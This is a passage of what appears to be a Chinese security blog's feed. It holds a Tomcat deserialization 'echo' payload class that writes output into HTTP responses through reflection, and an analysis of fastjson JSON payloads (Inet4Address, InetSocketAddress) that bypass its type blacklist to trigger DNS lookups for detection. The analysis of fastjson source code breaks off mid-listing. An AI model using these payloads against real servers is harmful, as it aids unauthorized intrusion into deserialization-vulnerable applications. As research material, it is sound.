class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.buf.ByteChunk;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tomcat7EchoByC0ny1</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tomcat7EchoByC0ny1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object obj = Thread.currentThread();</span><br><span class="line">            Field field = obj.getClass().getSuperclass().getDeclaredField(<span class="string">"group"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = obj.getClass().getDeclaredField(<span class="string">"threads"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            Thread[] threads = (Thread[]) obj;</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread.getName().contains(<span class="string">"http-apr"</span>) &amp;&amp; thread.getName().contains(<span class="string">"Poller"</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        field = thread.getClass().getDeclaredField(<span class="string">"target"</span>);</span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        obj = field.get(thread);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        field = obj.getClass().getDeclaredField(<span class="string">"this$0"</span>);</span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">                        field = obj.getClass().getDeclaredField(<span class="string">"handler"</span>);</span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">                        field = obj.getClass().getSuperclass().getDeclaredField(<span class="string">"global"</span>);</span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">                        field = obj.getClass().getDeclaredField(<span class="string">"processors"</span>);</span><br><span class="line">                        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">                        ArrayList processors = (ArrayList) obj;</span><br><span class="line">                        <span class="keyword">for</span> (Object o : processors) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                field = o.getClass().getDeclaredField(<span class="string">"req"</span>);</span><br><span class="line">                                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                                obj = field.get(o);</span><br><span class="line">                                org.apache.coyote.Request request = (org.apache.coyote.Request) obj;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">byte</span>[] buf = <span class="string">"Test by c0ny1"</span>.getBytes();</span><br><span class="line">                                ByteChunk bc = <span class="keyword">new</span> ByteChunk();</span><br><span class="line">                                bc.setBytes(buf, <span class="number">0</span>, buf.length);</span><br><span class="line">                                request.getResponse().doWrite(bc);</span><br><span class="line">                            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终生成反序列化数据提交至服务器即可回显</p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/4.png" alt="tomcat回显"></p><p>通过<code>java-object-searcher</code>，我不仅挖掘到了之前师傅们公开的链，还挖掘到了其他未公开的。同时在其他中间件下也实现了回显，下面列举几个比较冷门的中间件。</p><p><strong>1. Jetty</strong></p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/jetty_chain.png" alt></p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/jetty.jpg" alt></p><p><strong>2. WildFly</strong></p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/wildfly_chain.png" alt="wildfly挖掘结果"></p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/wildfly.jpg" alt="wildfly回显"></p><p><strong>3. Resin</strong></p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/resin_chain.png" alt="resin挖掘结果"></p><p><img src="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/resin.jpg" alt="resin回显"></p><h2 id="0x06-最后的思考"><a href="#0x06-最后的思考" class="headerlink" title="0x06 最后的思考"></a>0x06 最后的思考</h2><p>有了半自动化，就想着全自动。这种运行时动态挖掘的局限性是需要人工确定那些全局变量存有request，这是只能半自动的原因。那么是否可以通过静态分析源码的方式来解决呢？比如<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">gadgetinspector</a>原来是挖掘gadget的，能否更换它的<code>source</code>和<code>slink</code>定义，将其改造为全自动化挖掘request呢？有兴趣的朋友可以去试试。</p><p>PS:写到这里我在想Avicii在写完《The Nights》时是怎样的心情，或许和我此时的心情一样，无以言表。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;本文献给永远的&lt;code&gt;Avicii&lt;/code&gt;,严格意义上我不算是一个&lt;code&gt;reaver
      
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>通过dnslog探测fastjson的几种方法</title>
    <link href="http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/"/>
    <id>http://gv7.me/articles/2020/several-ways-to-detect-fastjson-through-dnslog/</id>
    <published>2020-03-24T15:17:55.000Z</published>
    <updated>2020-03-24T17:55:23.871Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>在渗透测试中遇到json数据一般都会测试下有没有反序列化。然而json库有<code>fastjson</code>,<code>jackson</code>,<code>gson</code>等等。怎么判断后端不是fastjson呢？这就需要构造特定的payload了。</p><p>昨天翻看fastjson源码时发现了一些可以构造dns解析且没在黑名单当中的类，于是顺手给官方提了下<a href="https://github.com/alibaba/fastjson/issues/3077" target="_blank" rel="noopener">Issue</a>。有趣的是后续的师傅们讨论还挺热闹的，我也在这次讨论中学习了很多。这篇文章算是对那些方法的汇总和原理分析。</p><p><img src="/articles/2020/several-ways-to-detect-fastjson-through-dnslog/1.png" alt="给fastjson官方提的issue"></p><h2 id="0x02-方法一-利用java-net-Inet-4-6-Address"><a href="#0x02-方法一-利用java-net-Inet-4-6-Address" class="headerlink" title="0x02  方法一:利用java.net.Inet[4|6]Address"></a>0x02  方法一:利用java.net.Inet[4|6]Address</h2><p>很早之前有一个方法是使用<code>java.net.InetAddress</code>类，现在这个类已经列入黑名单。然而在翻阅fastjson最新版源码(<code>v1.2.67</code>)时，发现两个类没有在黑名单中，于是可以构造了如下payload，即可使fastjson进行DNS解析。下面以<code>java.net.Inet4Address</code>为例分析构造原理。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"java.net.Inet4Address"</span>,<span class="attr">"val"</span>:<span class="string">"dnslog"</span>&#125;</span><br><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"java.net.Inet6Address"</span>,<span class="attr">"val"</span>:<span class="string">"dnslog"</span>&#125;</span><br></pre></td></tr></table></figure><p>我们知道在fastjson在反序列化之前都会调用<code>checkAutoType</code>方法对类进行检查。通过调试发现，由于<code>java.net.Inet4Address</code>不在黑名单中，所以就算开启AutoType也是能过<code>1</code>处的检查。</p><p>fastjson的ParserConfig类自己维护了一个<code>IdentityHashMap</code>，在这个HashMap中的类会被认为是安全的。在<code>2</code>处可以在IdentityHashMap中可以获取到<code>java.net.Inet4Address</code>，所以<code>clazz</code>不为<code>null</code>，导致在<code>3</code>处就返回了。跳过了后续的未开启<code>AutoType</code>的黑名单检查。所以可以发现无论<code>AutoType</code>是否开启，都可以过<code>checkAutoType</code>的检查</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.parser.ParserConfig#checkAutoType</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">    ...</span><br><span class="line">    Class clazz;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1.当打开了autoTypeSupport,类名又不在白名单时进行的黑名单检查</span></span><br><span class="line">    <span class="keyword">if</span> (!internalWhite &amp;&amp; (<span class="keyword">this</span>.autoTypeSupport || expectClassFlag)) &#123;</span><br><span class="line">        hash = h3;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">            hash ^= (<span class="keyword">long</span>)className.charAt(mask);</span><br><span class="line">            hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">            ....</span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span> &amp;&amp; Arrays.binarySearch(<span class="keyword">this</span>.acceptHashCodes, fullHash) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 2. fastjson的ParserConfig类自己维护了一个IdentityHashMap在这个HashMap中的类会被认为是安全的，会直接被返回。</span></span><br><span class="line">        clazz = <span class="keyword">this</span>.deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">        clazz = (Class)<span class="keyword">this</span>.typeMapping.get(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (internalWhite) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 3. 直接返回，不再走下面的autoTypeSupport和黑名单检查</span></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 4. 不开启autoType时，进行的黑名单检查</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.autoTypeSupport) &#123;</span><br><span class="line">            hash = h3;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">                <span class="keyword">char</span> c = className.charAt(mask);</span><br><span class="line">                hash ^= (<span class="keyword">long</span>)c;</span><br><span class="line">                hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastjason对于<code>Inet4Address</code>类会使用<code>MiscCodec</code>这个<code>ObjectDeserializer</code>来反序列化。跟进发现解析器会取出val字段的值赋值给strVal变量，由于我们的类是Inet4Address，所以代码会执行到1处，进行域名解析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.serializer.MiscCodec#deserialze</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        objVal = parser.parse();</span><br><span class="line"> ...</span><br><span class="line">        strVal = (String)objVal;</span><br><span class="line">        <span class="keyword">if</span> (strVal != <span class="keyword">null</span> &amp;&amp; strVal.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz == UUID.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == URI.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == URL.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == Pattern.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == Locale.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz == SimpleDateFormat.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (clazz != InetAddress.class &amp;&amp; clazz != Inet4Address.class &amp;&amp; clazz != Inet6Address.class) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 1. 将strVal作为主机名,获取其对应的ip，域名在此处被解析</span></span><br><span class="line">                    <span class="keyword">return</span> InetAddress.getByName(strVal);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnknownHostException var11) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"deserialize inet adress error"</span>, var11);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-方法二-利用java-net-InetSocketAddress"><a href="#0x03-方法二-利用java-net-InetSocketAddress" class="headerlink" title="0x03 方法二:利用java.net.InetSocketAddress"></a>0x03 方法二:利用java.net.InetSocketAddress</h2><p><code>java.net.InetSocketAddress</code>类也在<code>IdentityHashMap</code>中，和上面一样无视<code>checkAutoType</code>检查。</p><p>通过它要走到<code>InetAddress.getByName()</code>流程相比方法一是要绕一些路的。刚开始一直没构造出来，后来在和实验室的<code>@背影</code>师傅交流时，才知道可以顺着解析器规则构造（<code>它要啥就给它啥</code>），最终payload如下，当然它是畸形的json。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"java.net.InetSocketAddress"</span>&#123;<span class="attr">"address"</span>:,<span class="attr">"val"</span>:<span class="string">"dnslog"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>那这个是怎样构造出来的呢？这就需要简单了解下fastjson的词法分析器了，这里就不展开了。这里尤为关键的是解析器<code>token</code>值对应的含义，可以在<code>com.alibaba.fastjson.parser.JSONToken</code>类中看到它们。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.parser.JSONToken</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSONToken</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">name</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(value) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"int"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"float"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"string"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"iso8601"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"true"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"false"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"null"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"new"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"("</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">")"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&#123;"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&#125;"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">14</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"["</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"]"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">","</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">":"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"ident"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">19</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"fieldName"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"EOF"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Set"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">22</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"TreeSet"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">23</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"undefined"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">";"</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"."</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">26</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"hex"</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Unknown"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造这个payload需要分两步，第一步我们需要让代码执行到1处，这一路解析器要接收的字符在代码已经标好。按照顺序写就是<code>{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.alibaba.fastjson.serializer.MiscCodec#deserialze</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer;</span><br><span class="line">        String className;</span><br><span class="line">        <span class="keyword">if</span> (clazz == InetSocketAddress.class) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lexer.token() == <span class="number">8</span>) &#123;</span><br><span class="line">                lexer.nextToken();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 12 ---&gt; &#123;</span></span><br><span class="line">                parser.accept(<span class="number">12</span>);</span><br><span class="line">                InetAddress address = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">int</span> port = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                    className = lexer.stringVal();</span><br><span class="line">                    </span><br><span class="line">                    lexer.nextToken(<span class="number">17</span>);</span><br><span class="line">                    <span class="comment">// 字段名需要为address</span></span><br><span class="line">                    <span class="keyword">if</span> (className.equals(<span class="string">"address"</span>)) &#123;</span><br><span class="line">                        <span class="comment">// 17 ---&gt; :</span></span><br><span class="line">                        parser.accept(<span class="number">17</span>);</span><br><span class="line">                        <span class="comment">// 1. 我们需要让解析器走到这里</span></span><br><span class="line">                        address = 